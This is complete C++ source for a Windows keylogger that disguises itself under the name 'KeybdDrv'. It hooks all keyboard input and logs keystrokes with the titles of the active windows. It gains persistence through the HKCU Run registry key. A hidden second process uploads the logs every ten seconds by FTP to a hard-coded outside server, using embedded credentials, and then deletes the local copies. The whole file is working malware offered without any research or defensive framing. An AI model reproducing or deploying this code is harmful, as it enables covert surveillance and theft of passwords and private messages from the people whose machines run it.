#define _WIN32_WINNT  0x1337
#include <fstream>
#include <windows.h>
#include <wininet.h>
#include <time.h>
#include <shlwapi.h>

using namespace std;

HHOOK keybdHook = NULL;
char szWindowInFocus[512];
char szPreviousFocus[512];
char szUserProfile[MAX_PATH];
char szComputerName[64];
char szAppDataRoamingPath[MAX_PATH];
char szLogFilePath[MAX_PATH];

char szFTPServer[] = "druciferre.sytes.net";
char szFTPPort[] = "21";
char szFTPUser[] = "keybddrv";
char szFTPPass[] = "keybddrv";

LRESULT CALLBACK KeybdHookProc( int, WPARAM, LPARAM );
VOID CALLBACK UploadLogs( HWND, UINT, UINT_PTR, DWORD );
bool AddToHKCUStartup( char*, char* );


int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
{

	MSG messages;
	OSVERSIONINFO osvi;
	DWORD dwSize = sizeof(szComputerName);
	UINT uTimerResult = 0;
	
	/* Make sure global variables are completely null, no phantom memory      */
	memset( szWindowInFocus, '\0', 512 );
	memset( szPreviousFocus, '\0', 512 );
	memset( szAppDataRoamingPath, '\0', MAX_PATH );
	memset( szLogFilePath, '\0', MAX_PATH );
	memset( szComputerName, '\0', sizeof(szComputerName) );
	memset( szUserProfile, '\0', sizeof(MAX_PATH) );
	memset( &osvi, '\0', sizeof(OSVERSIONINFO) );
	
	/* Determine the user's profile path	                                  */
	ExpandEnvironmentStrings("%USERPROFILE%", szUserProfile, MAX_PATH );
	strcpy( szAppDataRoamingPath, szUserProfile );
		
	/* Determine Windows version and set appropriate App Data path            */
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx( &osvi );
	
	if( osvi.dwMajorVersion >= 6 )
		PathAppend( szAppDataRoamingPath, "AppData\\Roaming\\KeybdDrv" );
	else
		PathAppend( szAppDataRoamingPath, "Application Data\\KeybdDrv" );		

	/* Get the computer name                                                  */
	GetComputerName( szComputerName, &dwSize );

	/* check if this is the keyboard hook or upload process                   */
	if( __argc > 1 && 0 == strcmp(__argv[1],"upload") )
	{
		/* Start the upload timer                                             */
		uTimerResult = SetTimer( NULL, 1337, 10000, (TIMERPROC)UploadLogs );
	}
	else
	{

		/* Create the log directory                                           */
		CreateDirectory( szAppDataRoamingPath, NULL );

		/* Add the program in it's current path to the startup                */
		AddToHKCUStartup( "KeybdDrv", __argv[0] );
	
		/* Start the keyboard hook                                            */
		keybdHook = SetWindowsHookEx( WH_KEYBOARD_LL, KeybdHookProc, hInstance, 0 );

		/* launch the upload process                                          */
		ShellExecute( NULL, "open", __argv[0], "upload", NULL, SW_HIDE );
		
	}

	/* Wait                                                                   */
	while( GetMessage(&messages, NULL, 0, 0) )
	{
		TranslateMessage(&messages);
		DispatchMessage(&messages);
	}


	if( 0 != uTimerResult )	
		KillTimer( NULL, 1337 );

	if( NULL != keybdHook )
		UnhookWindowsHookEx( keybdHook );
	
	return messages.wParam;
}


LRESULT CALLBACK KeybdHookProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

	if( wParam == WM_KEYDOWN || wParam == WM_KEYUP )
	{
		
		time_t secs = time(0);
		tm *t = localtime( &secs );
		char timestamp[200]; 
		bool bShift = (0x8000 & GetKeyState(VK_LSHIFT)) || (0x8000 & GetKeyState(VK_RSHIFT));
		bool bCapsLock = (0x0001 & GetKeyState(VK_CAPITAL));
		bool bNumlock = (0x0001 & GetKeyState(VK_NUMLOCK));
		
		/* Format time for log file name                                      */
		strftime( timestamp, sizeof(timestamp), "%Y%m%d%H", t );
		
		/* Generate the log file path                                         */
		memset( szLogFilePath, '\0', MAX_PATH );
		sprintf( szLogFilePath, "%s\\%s-%s.log", szAppDataRoamingPath, szComputerName, timestamp );
		
		/* Open the log file for appending                                    */
		ofstream out(szLogFilePath, ios::app);

		/* Determine if active title is different and write the title to log  */
		strcpy( szPreviousFocus, szWindowInFocus );
		GetWindowText( GetForegroundWindow(), szWindowInFocus, sizeof(szWindowInFocus) );
		if( 0 != strcmp(szWindowInFocus,szPreviousFocus) )
			out << endl << endl << "[FOCUS=" << szWindowInFocus << "]" << endl << endl;
			
		if( wParam == WM_KEYDOWN )
		{
			
			switch (p->vkCode)
			{
				case 0xBE:			out << (bShift?">":".");	break;
				case 0xC0:			out << (bShift?"~":"`");	break;
				case 0xBD:			out << (bShift?"_":"-");	break;
				case 0xBB:			out << (bShift?"+":"=");	break;
				case 0xDE:			out << (bShift?"\"":"'");	break;
				case 0xBA:			out << (bShift?":":";");	break;
				case 0xBC:			out << (bShift?"<":",");	break;
				case 0xBF:			out << (bShift?"?":"/");	break;
				case 0xDC:			out << (bShift?"|":"\\");	break;
				case 0x30:			out << (bShift?")":"0");	break;
				case 0x31:			out << (bShift?"!":"1");	break;
				case 0x32:			out << (bShift?"@":"2");	break;
				case 0x33:			out << (bShift?"#":"3");	break;
				case 0x34:			out << (bShift?"$":"4");	break;
				case 0x35:			out << (bShift?"%":"5");	break;
				case 0x36:			out << (bShift?"^":"6");	break;
				case 0x37:			out << (bShift?"&":"7");	break;
				case 0x38:			out << (bShift?"*":"8");	break;
				case 0x39:			out << (bShift?"(":"0");	break;
				case VK_BACK:		out << "[BACKSPACE]";	break;
				case VK_CAPITAL:	out << "[CAPLOCK]";		break;
				case VK_CLEAR:		out << "[CLEAR]";		break;
				case VK_CONTROL:	out << "[CONTROL]";		break;
				case VK_DELETE:		out << "[DELETE]";		break;
				case VK_DOWN:		out << "[DOWN]";		break;
				case VK_END:		out << "[END]";			break;
				case VK_ESCAPE:		out << "[ESCAPE]";		break;
				case VK_F1:			out << "[F1]";			break;
				case VK_F2:			out << "[F2]";			break;
				case VK_F3:			out << "[F3]";			break;
				case VK_F4:			out << "[F4]";			break;
				case VK_F5:			out << "[F5]";			break;
				case VK_F6:			out << "[F6]";			break;
				case VK_F7:			out << "[F7]";			break;
				case VK_F8:			out << "[F8]";			break;
				case VK_F9:			out << "[F9]";			break;
				case VK_F10:		out << "[F10]";			break;
				case VK_F11:		out << "[F11]";			break;
				case VK_F12:		out << "[F12]";			break;
				case VK_HOME:		out << "[HOME]";		break;
				case VK_INSERT:		out << "[INSERT]";		break;
				case VK_LCONTROL:	out << "[LCTRL]";		break;
				case VK_LEFT:		out << "[LEFT]";		break;
				case VK_LSHIFT:		/*out << "[LSHIFT]";*/	break;
				case VK_LWIN:		out << "[LWIN]";		break;
				case VK_MENU:		out << "[ALT]";			break;
				case VK_NEXT:		out << "[PAGE DOWN]";	break;
				case VK_NUMLOCK:	out << "[NUMLOCK]";		break;
				case VK_NUMPAD0:	out << (bNumlock?"0":"[INSERT]"); break;
				case VK_NUMPAD1:	out << (bNumlock?"1":"[END]");	break;
				case VK_NUMPAD2:	out << (bNumlock?"2":"[DOWN]");	break;
				case VK_NUMPAD3:	out << (bNumlock?"3":"[PAGE DOWN]"); break;
				case VK_NUMPAD4:	out << (bNumlock?"4":"[LEFT]"); break;
				case VK_NUMPAD5:	out << (bNumlock?"5":""); break;
				case VK_NUMPAD6:	out << (bNumlock?"6":"[RIGHT]"); break;
				case VK_NUMPAD7:	out << (bNumlock?"7":"[HOME]"); break;
				case VK_NUMPAD8:	out << (bNumlock?"8":"[UP]"); break;
				case VK_NUMPAD9:	out << (bNumlock?"9":"[PAGE UP]"); break;
				case VK_PAUSE:		out << "[PAUSE]";		break;
				case VK_PRINT:		out << "[PRINT]";		break;
				case VK_PRIOR:		out << "[PAGE UP]";		break;
				case VK_RCONTROL:	out << "[RCTRL]";		break;
				case VK_RETURN:		out << "[ENTER]"<<endl; break;
				case VK_RIGHT:		out << "[RIGHT]";		break;
				case VK_RSHIFT:		/*out << "[RSHIFT]";*/	break;
				case VK_RWIN:		out << "[RWIN]";		break;
				case VK_SELECT:		out << "[SELECT]"; 		break;
				case VK_SHIFT:		/*out << "[SHIFT]";*/	break;
				case VK_SPACE:		out << "[SPACE]";		break;
				case VK_TAB:		out << "[TAB]";			break;
				case VK_UP:			out << "[UP]";			break;
				default:
						if( p->vkCode >= 0x41 && p->vkCode <= 0x5A )
							if( (bShift && !bCapsLock) || (!bShift && bCapsLock) )
								out << (char)(p->vkCode); 
							else
								out << (char)(p->vkCode+0x20); 
						else 
							out << "[" << p->vkCode << "]";
					break;
			}
		
		}
	
		out.close();

	

	}
	
	
	return CallNextHookEx( NULL, nCode, wParam, lParam );
	
}


VOID CALLBACK UploadLogs( HWND hWnd, UINT uMsg, UINT_PTR idTimer, DWORD dwTime )
{
	
	HANDLE hFind;
	WIN32_FIND_DATA ffd;
	char path[MAX_PATH], curlog[MAX_PATH];
	time_t secs = time(0);
	tm *t = localtime( &secs );
	char timestamp[200]; 
	HINTERNET hInternet;
	HINTERNET hFTP;
	
	
	strftime( timestamp, sizeof(timestamp), "%Y%m%d%H", t );
	sprintf( path, "%s\\%s-*.log", szAppDataRoamingPath, szComputerName );
	sprintf( curlog, "%s-%s.log", szComputerName, timestamp );

	hInternet = InternetOpen( NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 );
	hFTP = InternetConnect( hInternet, szFTPServer, atoi(szFTPPort), szFTPUser, szFTPPass, INTERNET_SERVICE_FTP, 0, 0 );
	
	if( NULL == hFTP )
	{
		MessageBox( NULL, "failed to open ftp connection", NULL, MB_OK );
		return;
	}
	
	hFind = FindFirstFile( path, &ffd );

	if( INVALID_HANDLE_VALUE == hFind )
		return;
		
	do
	{
		/* skip directories */
		if( (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) )
			continue;
		
		/* don't want to upload the log we're currently working on */
		if( 0 == strcmp(ffd.cFileName,curlog) )
			continue;
		
		sprintf( path, "%s\\%s", szAppDataRoamingPath, ffd.cFileName );
		//MessageBox( NULL, path, NULL, MB_OK );
		
		if( FtpPutFile(hFTP,path,ffd.cFileName,FTP_TRANSFER_TYPE_BINARY,0) )
			DeleteFile( path );
		else
			MessageBox( NULL, ffd.cFileName, "failed to upload", MB_OK );
		 
	} while( 0 != FindNextFile(hFind, &ffd) );
	
	FindClose( hFind );
	InternetCloseHandle( hFTP );
	InternetCloseHandle( hInternet );

	return;
}


bool AddToHKCUStartup( char *pszKeyName, char *pszPath )
{

	HKEY hReg;
	
	if( ERROR_SUCCESS != RegOpenKeyEx( HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hReg  )  )
		return false;
	
	if( ERROR_SUCCESS != RegSetValueEx( hReg, pszKeyName, 0, REG_SZ, (LPBYTE)pszPath, strlen(pszPath) ) )
		return false;
	
	RegCloseKey( hReg );
	
	return true;
	
}

